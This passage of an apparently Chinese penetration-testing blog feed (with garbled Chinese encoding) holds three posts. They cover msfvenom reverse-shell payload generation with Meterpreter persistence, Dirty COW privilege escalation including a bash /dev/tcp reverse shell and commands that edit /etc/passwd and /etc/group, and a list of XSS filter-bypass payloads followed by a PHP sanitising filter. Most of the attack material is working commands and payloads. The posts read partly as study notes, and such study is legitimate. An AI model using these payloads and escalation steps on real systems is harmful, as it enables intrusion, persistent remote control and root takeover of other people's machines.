    <published>2017-08-29T12:10:56.000Z</published>
    <updated>2018-02-26T04:25:52.913Z</updated>
    
    <content type="html"><![CDATA[<h4 id="äºŒè¿›åˆ¶æ–‡ä»¶"><a href="#äºŒè¿›åˆ¶æ–‡ä»¶" class="headerlink" title="äºŒè¿›åˆ¶æ–‡ä»¶"></a>äºŒè¿›åˆ¶æ–‡ä»¶</h4><p>Windows<a id="more"></a></p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT= Port -f exe &gt; shell.exe</code></p><p>Linux</p><p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= IP LPORT= Port -f elf &gt; shell.elf</code></p><p>Mac</p><p><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST= IP LPORT= Port -f macho &gt; shell.macho</code></p><h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>PHP</p><p><code>msfvenom -p php/meterpreter_reverse_tcp LHOST= IP LPORT= Port -f raw &gt; shell.php</code></p><p>ASP</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=Port -f asp &gt; shell.asp</code></p><p>JSP</p><p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST= IP LPORT= Port -f raw &gt; shell.jsp</code></p><p>WAR</p><p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST= IP LPORT=Port -f war &gt; shell.war</code></p><h4 id="è„šæœ¬shellï¼ˆåå¼¹shellï¼‰"><a href="#è„šæœ¬shellï¼ˆåå¼¹shellï¼‰" class="headerlink" title="è„šæœ¬shellï¼ˆåå¼¹shellï¼‰"></a>è„šæœ¬shellï¼ˆåå¼¹shellï¼‰</h4><p>Python</p><p><code>msfvenom -p cmd/unix/reverse_python LHOST= IP LPORT=Port -f raw &gt; shell.py</code></p><p>Bash</p><p><code>msfvenom -p cmd/unix/reverse_bash LHOST= IP LPORT=Port -f raw &gt; shell.sh</code></p><p>Perl</p><p><code>msfvenom -p cmd/unix/reverse_perl LHOST= IP LPORT=Port -f raw &gt; shell.pl</code></p><h4 id="é™„ï¼šæŒç»­æ§åˆ¶"><a href="#é™„ï¼šæŒç»­æ§åˆ¶" class="headerlink" title="é™„ï¼šæŒç»­æ§åˆ¶"></a>é™„ï¼šæŒç»­æ§åˆ¶</h4><p>åœ¨æ”»å‡»æˆåŠŸä¹‹åä¼šåå¼¹å›ä¸€ä¸ªä¼šè¯ï¼Œå½“æœ¨é©¬è¢«åˆ é™¤æˆ–ä¸ç»§ç»­è¿è¡Œæ—¶ï¼Œæˆ‘ä»¬å°±æ— æ³•å†è·å¾—åå¼¹çš„ä¼šè¯ï¼Œé‚£ä¹ˆæƒ³è¦è¿›è¡Œä¸€ä¸ªæŒç»­çš„æ§åˆ¶å°±éœ€è¦åœ¨ç¬¬ä¸€æ¬¡è·å¾—ä¼šè¯æ—¶åŠ¨ä¸€äº›æ‰‹è„š<br>run persistence -U -i 5 â€“r ip port<br>-U ç”¨æˆ·ç™»å½•æ—¶åå¼¹ä¼šè¯ ä¹Ÿå¯ä»¥ä½¿ç”¨-Xå½“ç³»ç»Ÿå¯åŠ¨æ—¶åå¼¹ä¼šè¯<br>-i æ—¶é—´</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;äºŒè¿›åˆ¶æ–‡ä»¶&quot;&gt;&lt;a href=&quot;#äºŒè¿›åˆ¶æ–‡ä»¶&quot; class=&quot;headerlink&quot; title=&quot;äºŒè¿›åˆ¶æ–‡ä»¶&quot;&gt;&lt;/a&gt;äºŒè¿›åˆ¶æ–‡ä»¶&lt;/h4&gt;&lt;p&gt;Windows
    
    </summary>
    
      <category term="æ¸—é€æµ‹è¯•" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="msfvenom" scheme="http://sunu11.com/tags/msfvenom/"/>
    
  </entry>
  
  <entry>
    <title>Dirty COWçš„é‚£äº›äº‹</title>
    <link href="http://sunu11.com/2017/08/28/15/"/>
    <id>http://sunu11.com/2017/08/28/15/</id>
    <published>2017-08-28T14:08:08.000Z</published>
    <updated>2018-11-03T11:57:21.377Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡åˆæ˜¯ä¸€æ¬¡ç¬”è®°å›é¡¾ï¼Œå°†docçš„ç¬”è®°ç”¨markdownå†™ä¸€éï¼Œå›é¡¾ä¸€ä¸‹23333333<a id="more"></a></p><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>æ¼æ´ç¼–å·ï¼šCVE-2016-5195 </p><p>æ¼æ´åç§°ï¼šè„ç‰›ï¼ˆDirty COWï¼‰ </p><p>æ¼æ´å±å®³ï¼šä½æƒé™ç”¨æˆ·åˆ©ç”¨è¯¥æ¼æ´æŠ€æœ¯å¯ä»¥åœ¨å…¨ç‰ˆæœ¬ Linux ç³»ç»Ÿä¸Šå®ç°æœ¬åœ°ææƒ </p><p>å½±å“èŒƒå›´ï¼šLinux å†…æ ¸2.6.22 &lt; 3.9 (x86/x64)</p><p>åŸç†:<br>Linux å†…æ ¸çš„å†…å­˜å­ç³»ç»Ÿåœ¨å¤„ç†å†™å…¥æ—¶å¤åˆ¶ï¼ˆcopy-on-write, COWï¼‰æ—¶äº§ç”Ÿäº†ç«äº‰æ¡ä»¶ï¼ˆrace<br>conditionï¼‰ã€‚æ¶æ„ç”¨æˆ·å¯åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ¥è·å–é«˜æƒé™ï¼Œå¯¹åªè¯»å†…å­˜æ˜ å°„è¿›è¡Œå†™è®¿é—®ã€‚ï¼ˆA race condition was found in the way the Linux kernelâ€™s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings.ï¼‰ ç«äº‰æ¡ä»¶ï¼ŒæŒ‡çš„æ˜¯ä»»åŠ¡æ‰§è¡Œé¡ºåºå¼‚å¸¸ï¼Œå¯å¯¼è‡´åº”ç”¨å´©æºƒï¼Œæˆ–ä»¤æ”»å‡»è€…æœ‰æœºå¯ä¹˜ï¼Œè¿›ä¸€æ­¥æ‰§è¡Œå…¶ä»–ä»£ç ã€‚åˆ©ç”¨è¿™ä¸€æ¼æ´ï¼Œæ”»å‡»è€…å¯åœ¨å…¶ç›®æ ‡ç³»ç»Ÿæå‡æƒé™ï¼Œå¯ä»¥è·å¾— root æƒé™ã€‚<br><em>*</em>åˆ©ç”¨ï¼š<a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c" target="_blank" rel="external">exp</a></p><h3 id="å¤ç°ä¸æ€»ç»“"><a href="#å¤ç°ä¸æ€»ç»“" class="headerlink" title="å¤ç°ä¸æ€»ç»“"></a>å¤ç°ä¸æ€»ç»“</h3><p>åœ¨æœ¬åœ°éƒ¨ç½²ä¸€ä¸ªæ¼æ´ç¯å¢ƒï¼Œä½¿ç”¨webæœåŠ¡å™¨ä¸Šçš„å¤§é©¬åå¼¹ shellååˆ©ç”¨dirty cow è¿›è¡Œææƒ<br>    åå¼¹shellï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -l -p 22222 -vv </div><div class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</div></pre></td></tr></table></figure></p><p>æŸ¥çœ‹ç‰ˆæœ¬ï¼š<br><code>cat /proc/versionã€uname -aã€lsb release -a</code>å‡å¯</p><p>ç¼–è¯‘ï¼š<br><code>gcc -pthread exp.c -o exp -lcrypt</code></p><p>æ‰§è¡Œ./exp å³å¯ä¸ºç”¨æˆ·firefart è®¾ç½®å¯†ç </p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-17.png" alt="q-17"></p><p>ç„¶åå³å¯ç”¨æ·»åŠ çš„ç”¨æˆ·è¿æ¥ä¸»æœº</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-18.png" alt="q-18"></p><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ç”¨ä¸‹é¢ä¸€äº›æ–¹å¼è¿›è¡Œææƒï¼ˆå­¦ä¹ è‡ªäº’è”ç½‘ï¼‰<br>1)åœ¨/tmp/.pwnå†™å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">echo MOOOOOOOOOOO</div><div class="line">/bin/bash</div></pre></td></tr></table></figure><p>chmod+x/tmp/.pwn<br>ç„¶åä¿®æ”¹/etc/passwdä¸­çš„shellæŒ‡å‘<br><code>./dirtyc0w /etc/passwd root:x:0:0:root:/root:/tmp/.pwn</code></p><p>2)æ·»åŠ ç”¨æˆ·åˆ°sudoç»„</p><p><code>./dirtyc0w /etc/group &quot;$(sed&#39;s/\(sudo:x:.*:\)/\1test1/g&#39;/etc/group)&quot;</code></p><p>ä¸‹æ¬¡ç®¡ç†å‘˜å†ç™»é™†çš„è¯ sudo suä¸éœ€è¦å¯†ç </p><p>3)å°†/etc/passwdä¸­çš„uidä½æ”¹ä¸º0</p><p>4)æ³¨å…¥shellcodeåˆ°suidæ–‡ä»¶ï¼Œæ¯”å¦‚æœ€å¸¸è§çš„2ä¸ªæ–‡ä»¶<br><code>/usr/bin/crontab</code><br><code>/usr/bin/passwd</code></p><p>ä¿®å¤æ–¹æ¡ˆï¼š</p><pre><code>Centos/RHELæ›´æ–°sudo yum updateUbuntu/Debianæ›´æ–°sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade</code></pre><p>æ›´æ–°åˆ°æœ€æ–°çš„å†…æ ¸ç‰ˆæœ¬å³å¯ã€‚<strong><em>éœ€è¦é‡å¯æ‰èƒ½ç”Ÿæ•ˆ</em></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ¬æ–‡åˆæ˜¯ä¸€æ¬¡ç¬”è®°å›é¡¾ï¼Œå°†docçš„ç¬”è®°ç”¨markdownå†™ä¸€éï¼Œå›é¡¾ä¸€ä¸‹23333333
    
    </summary>
    
      <category term="æ¸—é€æµ‹è¯•" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Linuxææƒ" scheme="http://sunu11.com/tags/Linux%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>æˆ‘ä¸XSSçš„æ„Ÿæƒ…ä¹‹è·¯(3)</title>
    <link href="http://sunu11.com/2017/08/28/14/"/>
    <id>http://sunu11.com/2017/08/28/14/</id>
    <published>2017-08-28T07:18:08.000Z</published>
    <updated>2018-11-03T11:56:59.172Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å¿ƒå¾—"><a href="#å¿ƒå¾—" class="headerlink" title="å¿ƒå¾—"></a>å¿ƒå¾—</h3><p>æ¥ç€ä¸Šä¸€æ–‡è¿‡æ¥ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯ä¸ªäººçš„ä¸€äº›æ€»ç»“ã€‚å¯¹äºæŒ–æ˜xssæ¼æ´ï¼Œç›®çš„éƒ½æ˜¯è®©è‡ªå·±çš„payloadå¯ä»¥æ‰§è¡Œï¼Œåœ¨å…¶æ¢ç´¢çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä¸ªäººé¦–å…ˆä¼šé€šè¿‡å®¡æŸ¥å…ƒç´ ï¼Œäº†è§£å…¶è¾“å…¥ç‚¹ï¼Œè¿‡æ»¤è§„åˆ™ï¼Œç„¶å<a id="more"></a>å†é’ˆå¯¹æ€§çš„è¿›è¡Œpayloadçš„æ„é€ ã€‚é¦–å…ˆï¼Œè¾“å…¥æ¡†ã€flashã€cssã€ä¸Šä¼ ç‚¹ã€httpå¤´éƒ¨çš„å­—æ®µã€ç¬¬ä¸‰æ–¹æ’ä»¶ã€èƒ½ä¸»åŠ¨ä¿®æ”¹å…¶å‚æ•°å€¼çš„ä»»æ„å‚æ•°ç­‰ç­‰ï¼Œå­˜åœ¨è¾“å…¥çš„åœ°æ–¹éƒ½æœ‰å¯èƒ½å­˜åœ¨xssã€‚æ˜ç¡®å¥½ç›®æ ‡åï¼Œæˆ‘ä¹ æƒ¯å…ˆè¾“å…¥ä¸€å †æµ‹è¯•å­—ç¬¦çœ‹çœ‹å…¶è¿‡æ»¤è§„åˆ™ï¼š<br><code>&#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;{()}/&#39;scriptã€onã€alertã€promptã€confirmã€&lt;script src=&quot;http://x.js&quot;&gt; %c0u003cimg+src%3d1+onerror%3dalert(/xss/)+%c0u003eâ€¦â€¦</code><br>ä¸€èˆ¬éƒ½èƒ½åˆ¤æ–­å‡ºå¦‚ä½•è¿‡æ»¤çš„ï¼Œå°±åƒä¹‹å‰åšé¢˜çš„è¿‡ç¨‹ä¸­ï¼Œéƒ½æ˜¯ç»è¿‡æµ‹è¯•æ‰æœ‰ç»“æœï¼Œæ‰èƒ½å¯¹ç—‡ä¸‹è¯ã€‚</p><p>ç„¶åå¯¹äºè¿‡æ»¤è§„åˆ™ï¼Œæˆ‘æ€»ç»“äº†è¿™æ ·å‡ ç‚¹ï¼š</p><h4 id="1ã€å¤§å°å†™ï¼š"><a href="#1ã€å¤§å°å†™ï¼š" class="headerlink" title="1ã€å¤§å°å†™ï¼š"></a>1ã€å¤§å°å†™ï¼š</h4><p><code>&lt;ScRIpT&gt;alert(&#39;123&#39;)&lt;/sCRIpT&gt;</code></p><h4 id="2ã€ç¼–ç ç»•è¿‡ï¼š"><a href="#2ã€ç¼–ç ç»•è¿‡ï¼š" class="headerlink" title="2ã€ç¼–ç ç»•è¿‡ï¼š"></a>2ã€ç¼–ç ç»•è¿‡ï¼š</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.åå…­è¿›åˆ¶ç¼–ç </div><div class="line">.jsfuckç¼–ç </div><div class="line">.urlç¼–ç </div><div class="line">.unicodeç¼–ç </div><div class="line">.åŠ è§£å¯†</div><div class="line">.HTMLç¼–ç </div><div class="line">.hexç¼–ç </div><div class="line">.ASCIIç¼–ç </div></pre></td></tr></table></figure><h4 id="3ã€ç»•è¿‡magic-quotes-gpcï¼š"><a href="#3ã€ç»•è¿‡magic-quotes-gpcï¼š" class="headerlink" title="3ã€ç»•è¿‡magic_quotes_gpcï¼š"></a>3ã€ç»•è¿‡magic_quotes_gpcï¼š</h4><p><code>&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt;</code></p><h4 id="4ã€é—­åˆæ ‡ç­¾"><a href="#4ã€é—­åˆæ ‡ç­¾" class="headerlink" title="4ã€é—­åˆæ ‡ç­¾"></a>4ã€é—­åˆæ ‡ç­¾</h4><p><code>&quot;&gt;&lt;script&gt;alert(/123/)&lt;/script&gt;</code><br><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h4 id="5ã€æ ‡ç­¾ç»•è¿‡"><a href="#5ã€æ ‡ç­¾ç»•è¿‡" class="headerlink" title="5ã€æ ‡ç­¾ç»•è¿‡"></a>5ã€æ ‡ç­¾ç»•è¿‡</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</div><div class="line">&lt;button onclick=&quot;javascript:alert(&apos;xss&apos;)&gt;XSS&lt;/button&quot;&gt;</div><div class="line">&lt;title&gt;&lt;img a=&quot;&lt;/title&gt;&lt;img/src=1 onerror=alert(1)//&quot;&gt;</div><div class="line">&quot;onsubmit=javascript:alert(1)%20name=&quot;a</div><div class="line">&lt;svg/onload=prompt(1)&gt;ç­‰ç­‰</div></pre></td></tr></table></figure><h4 id="6ã€å…¶ä»–ç¬¦å·ç»•è¿‡"><a href="#6ã€å…¶ä»–ç¬¦å·ç»•è¿‡" class="headerlink" title="6ã€å…¶ä»–ç¬¦å·ç»•è¿‡"></a>6ã€å…¶ä»–ç¬¦å·ç»•è¿‡</h4><table><thead><tr><th>%0a alert(1);</th><th>%0a æ¢è¡Œç¬¦ %0d</th></tr></thead><tbody><tr><td>/**/</td><td>æ›¿æ¢ç©ºæ ¼</td></tr></tbody></table><hr><p>%00           |æˆªæ–­</p><p><strong><em>å¦å¤–åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå½“â€è¢«è¿‡æ»¤ï¼Œå¯ä»¥åœ¨IEå†…æ ¸ä¸‹ä½¿ç”¨ä¸¤ä¸ªåå¼•å·(`)TABé”®ä¸Šé¢çš„é‚£ä¸ªä»£æ›¿åŒå¼•å·.</em></strong></p><h5 id="7ã€åŒå­—æ¯ç»•è¿‡-lt-img-ononerrorerror-quot-123-quot-gt-ã€-lt-script-gt-alalertert-123-lt-script-gt"><a href="#7ã€åŒå­—æ¯ç»•è¿‡-lt-img-ononerrorerror-quot-123-quot-gt-ã€-lt-script-gt-alalertert-123-lt-script-gt" class="headerlink" title="7ã€åŒå­—æ¯ç»•è¿‡ &lt;img ononerrorerror=&quot;123&quot;&gt;ã€&lt;script&gt;alalertert(123)&lt;/script&gt;"></a>7ã€åŒå­—æ¯ç»•è¿‡ <code>&lt;img ononerrorerror=&quot;123&quot;&gt;ã€&lt;script&gt;alalertert(123)&lt;/script&gt;</code></h5><h5 id="8ã€å®½å­—èŠ‚ç»•è¿‡"><a href="#8ã€å®½å­—èŠ‚ç»•è¿‡" class="headerlink" title="8ã€å®½å­—èŠ‚ç»•è¿‡"></a>8ã€å®½å­—èŠ‚ç»•è¿‡</h5><p>gbxxxxç³»åˆ—çš„ç¼–ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°è¯•ä¸€ä¸‹å®½å­—èŠ‚  <code>%c0 %bf  %5c</code></p><h4 id="9ã€å…¶ä»–äº‹ä»¶ç»•è¿‡"><a href="#9ã€å…¶ä»–äº‹ä»¶ç»•è¿‡" class="headerlink" title="9ã€å…¶ä»–äº‹ä»¶ç»•è¿‡"></a>9ã€å…¶ä»–äº‹ä»¶ç»•è¿‡</h4><p>ï¼ˆæ¯”å¦‚è¿‡æ»¤äº†&lt;&gt;ä½¿ç”¨ <code>&quot;onmouseover=alert(11)  bad=</code>ï¼‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Â  onload</div><div class="line">Â Â onclick</div><div class="line">Â Â onerror</div><div class="line">Â Â prompt</div><div class="line">Â Â confirm</div><div class="line">Â  onmousemove</div></pre></td></tr></table></figure></p><p><strong><em>é™„å½•1ï¼š</em></strong></p><table><thead><tr><th>type</th><th>Horizontal Tab</th><th>New line</th><th>Carriage Return</th></tr></thead><tbody><tr><td>URL</td><td>%09</td><td>%10</td><td>%13         </td></tr></tbody></table><p>ç©ºå­—ç¬¦  (%00) ä½¿å¾—è¿‡æ»¤å™¨ä¸èƒ½çœ‹åˆ°å®Œæ•´çš„ <code>&lt;script&gt;</code>æ ‡ç­¾. åªåœ¨ IE 6.0, IE 7.0 å¯ä»¥ã€‚</p><p><strong><em>é™„å½•2ï¼š</em></strong></p><table><thead><tr><th>blank</th><th>%20 </th></tr></thead><tbody><tr><td>/</td><td>%2F  </td></tr><tr><td>â€”â€”</td><td>â€”â€”</td></tr><tr><td>?</td><td>%3F</td></tr><tr><td>â€”â€”</td><td>â€”â€”</td></tr><tr><td>+</td><td>%2B</td></tr></tbody></table><h3 id="é˜²å¾¡ï¼š"><a href="#é˜²å¾¡ï¼š" class="headerlink" title="é˜²å¾¡ï¼š"></a>é˜²å¾¡ï¼š</h3><p>å¯¹äºé‡‡ç”¨è¿‡æ»¤ã€è½¬ä¹‰æ¥é˜²å¾¡xssæ¼æ´æœ€åŸºæœ¬çš„æ–¹å¼ï¼Œå…·ä½“å®ç°ï¼Œå¿…é¡»åŸºäºä»£ç ï¼Œè€Œå¯¹åº”çš„é˜²å¾¡æ‹›å¼å·²ç»è®¸å¤šå‰è¾ˆä»¬éƒ½æœ‰åˆ†äº«ã€‚æˆ‘è§‰å¾—åšå¥½ç¼–ç ã€è¿‡æ»¤çš„å·¥ä½œä¹‹åï¼Œä¸‹é¢ä¸¤ä¸ªæªæ–½ä¹Ÿæ˜¯æœ‰å¿…è¦å®æ–½çš„ã€‚<br>1ï¼šä¸ºCookieåŠ ä¸ŠHttpOnlyæ ‡è®°ã€‚ä¿æŠ¤å¥½cookieï¼Œå°±ç®—å„ç§è¿‡æ»¤éƒ½è¢«ç»•è¿‡ï¼Œä¹Ÿæ— æ³•è¯»å–ã€ä¿®æ”¹cookieï¼Œèƒ½æœ‰æ•ˆçš„å‡è½»å±å®³ã€‚<br>2ï¼šéƒ¨ç½²wafæ˜¯ä¸€ä»¶å¾ˆæœ‰æ•ˆçš„å·¥ä½œã€‚ä¸€ä¸ªå…·æœ‰ä¸°å¯Œè§„åˆ™åº“çš„wafèƒ½å¤§å¹…åº¦è¿‡æ»¤æ‰æ¶æ„è¾“å…¥æ•°æ®ï¼Œä¸ªäººæ„Ÿè§‰ä¸»è¦æ˜¯èƒ½å¢åŠ çªç ´é˜²å¾¡çš„éš¾åº¦ï¼Œä¸ä»…ä»…é’ˆå¯¹äºxssæ¼æ´ï¼Œå…¶ä»–çš„æ¼æ´ä¹Ÿæ˜¯ä¸€æ ·ã€‚èƒ½æœ‰æ•ˆé™ä½å…¶é£é™©ã€‚<br>ä¸‹é¢æ˜¯ä¸€ä¸ªphpçš„xssè¿‡æ»¤å™¨ï¼š(å­¦ä¹ äºç½‘ä¸Šï¼Œå°†è¯¥ä»£ç åŠ å…¥åˆ°æ ¸å¿ƒå‡½æ•°åº“ï¼Œç„¶åå†è°ƒç”¨å³å¯)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">    function RemoveXSS($val) &#123;  </div><div class="line">       // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed  </div><div class="line">       // this prevents some character re-spacing such as &lt;java\0script&gt;  </div><div class="line">       // note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some inputs  </div><div class="line">       $val = preg_replace(&apos;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&apos;, &apos;&apos;, $val);  </div><div class="line">         </div><div class="line">       // straight replacements, the user should never need these since they&apos;re normal characters  </div><div class="line">       // this prevents like &lt;IMG SRC=@avascript:alert(&apos;XSS&apos;)&gt;  </div><div class="line">       $search = &apos;abcdefghijklmnopqrstuvwxyz&apos;; </div><div class="line">       $search .= &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;;  </div><div class="line">       $search .= &apos;1234567890!@#$%^&amp;*()&apos;; </div><div class="line">       $search .= &apos;~`&quot;;:?+/=&#123;&#125;[]-_|\&apos;\\&apos;; </div><div class="line">       for ($i = 0; $i &lt; strlen($search); $i++) &#123; </div><div class="line">          // ;? matches the ;, which is optional </div><div class="line">          // 0&#123;0,7&#125; matches any padded zeros, which are optional and go up to 8 chars </div><div class="line">        </div><div class="line">          // @ @ search for the hex values </div><div class="line">          $val = preg_replace(&apos;/(&amp;#[xX]0&#123;0,8&#125;&apos;.dechex(ord($search[$i])).&apos;;?)/i&apos;, $search[$i], $val); // with a ; </div><div class="line">          // @ @ 0&#123;0,7&#125; matches &apos;0&apos; zero to seven times  </div><div class="line">          $val = preg_replace(&apos;/(&amp;#0&#123;0,8&#125;&apos;.ord($search[$i]).&apos;;?)/&apos;, $search[$i], $val); // with a ; </div><div class="line">       &#125; </div><div class="line">        </div><div class="line">       // now the only remaining whitespace attacks are \t, \n, and \r </div><div class="line">       $ra1 = Array(&apos;javascript&apos;, &apos;vbscript&apos;, &apos;expression&apos;, &apos;applet&apos;, &apos;meta&apos;, &apos;xml&apos;, &apos;blink&apos;, &apos;link&apos;, &apos;style&apos;, &apos;script&apos;, &apos;embed&apos;, &apos;object&apos;, &apos;iframe&apos;, &apos;frame&apos;, &apos;frameset&apos;, &apos;ilayer&apos;, &apos;layer&apos;, &apos;bgsound&apos;, &apos;title&apos;, &apos;base&apos;); </div><div class="line">       $ra2 = Array(&apos;onabort&apos;, &apos;onactivate&apos;, &apos;onafterprint&apos;, &apos;onafterupdate&apos;, &apos;onbeforeactivate&apos;, &apos;onbeforecopy&apos;, &apos;onbeforecut&apos;, &apos;onbeforedeactivate&apos;, &apos;onbeforeeditfocus&apos;, &apos;onbeforepaste&apos;, &apos;onbeforeprint&apos;, &apos;onbeforeunload&apos;, &apos;onbeforeupdate&apos;, &apos;onblur&apos;, &apos;onbounce&apos;, &apos;oncellchange&apos;, &apos;onchange&apos;, &apos;onclick&apos;, &apos;oncontextmenu&apos;, &apos;oncontrolselect&apos;, &apos;oncopy&apos;, &apos;oncut&apos;, &apos;ondataavailable&apos;, &apos;ondatasetchanged&apos;, &apos;ondatasetcomplete&apos;, &apos;ondblclick&apos;, &apos;ondeactivate&apos;, &apos;ondrag&apos;, &apos;ondragend&apos;, &apos;ondragenter&apos;, &apos;ondragleave&apos;, &apos;ondragover&apos;, &apos;ondragstart&apos;, &apos;ondrop&apos;, &apos;onerror&apos;, &apos;onerrorupdate&apos;, &apos;onfilterchange&apos;, &apos;onfinish&apos;, &apos;onfocus&apos;, &apos;onfocusin&apos;, &apos;onfocusout&apos;, &apos;onhelp&apos;, &apos;onkeydown&apos;, &apos;onkeypress&apos;, &apos;onkeyup&apos;, &apos;onlayoutcomplete&apos;, &apos;onload&apos;, &apos;onlosecapture&apos;, &apos;onmousedown&apos;, &apos;onmouseenter&apos;, &apos;onmouseleave&apos;, &apos;onmousemove&apos;, &apos;onmouseout&apos;, &apos;onmouseover&apos;, &apos;onmouseup&apos;, &apos;onmousewheel&apos;, &apos;onmove&apos;, &apos;onmoveend&apos;, &apos;onmovestart&apos;, &apos;onpaste&apos;, &apos;onpropertychange&apos;, &apos;onreadystatechange&apos;, &apos;onreset&apos;, &apos;onresize&apos;, &apos;onresizeend&apos;, &apos;onresizestart&apos;, &apos;onrowenter&apos;, &apos;onrowexit&apos;, &apos;onrowsdelete&apos;, &apos;onrowsinserted&apos;, &apos;onscroll&apos;, &apos;onselect&apos;, &apos;onselectionchange&apos;, &apos;onselectstart&apos;, &apos;onstart&apos;, &apos;onstop&apos;, &apos;onsubmit&apos;, &apos;onunload&apos;); </div><div class="line">       $ra = array_merge($ra1, $ra2); </div><div class="line">        </div><div class="line">       $found = true; // keep replacing as long as the previous round replaced something </div><div class="line">       while ($found == true) &#123; </div><div class="line">          $val_before = $val; </div><div class="line">          for ($i = 0; $i &lt; sizeof($ra); $i++) &#123; </div><div class="line">             $pattern = &apos;/&apos;; </div><div class="line">             for ($j = 0; $j &lt; strlen($ra[$i]); $j++) &#123; </div><div class="line">                if ($j &gt; 0) &#123; </div><div class="line">                   $pattern .= &apos;(&apos;;  </div><div class="line">                   $pattern .= &apos;(&amp;#[xX]0&#123;0,8&#125;([9ab]);)&apos;; </div><div class="line">                   $pattern .= &apos;|&apos;;  </div><div class="line">                   $pattern .= &apos;|(&amp;#0&#123;0,8&#125;([9|10|13]);)&apos;; </div><div class="line">                   $pattern .= &apos;)*&apos;; </div><div class="line">                &#125; </div><div class="line">                $pattern .= $ra[$i][$j]; </div><div class="line">             &#125; </div><div class="line">             $pattern .= &apos;/i&apos;;  </div><div class="line">             $replacement = substr($ra[$i], 0, 2).&apos;&lt;x&gt;&apos;.substr($ra[$i], 2); // add in &lt;&gt; to nerf the tag  </div><div class="line">             $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags  </div><div class="line">             if ($val_before == $val) &#123;  </div><div class="line">                // no replacements were made, so exit the loop  </div><div class="line">                $found = false;  </div><div class="line">             &#125;  </div><div class="line">          &#125;  </div><div class="line">       &#125;  </div><div class="line">       return $val;  </div><div class="line">    &#125;   </div><div class="line">?&gt;</div></pre></td></tr></table></figure><p><strong><em>å‚è€ƒé“¾æ¥ï¼š</em></strong><br><a href="http://www.freebuf.com/sectool/108568.html" target="_blank" rel="external">http://www.freebuf.com/sectool/108568.html</a><br><a href="https://www.secpulse.com/archives/44299.html" target="_blank" rel="external">https://www.secpulse.com/archives/44299.html</a><br><a href="https://www.waitalone.cn/the-seven-principles-of-xss-defense.html" target="_blank" 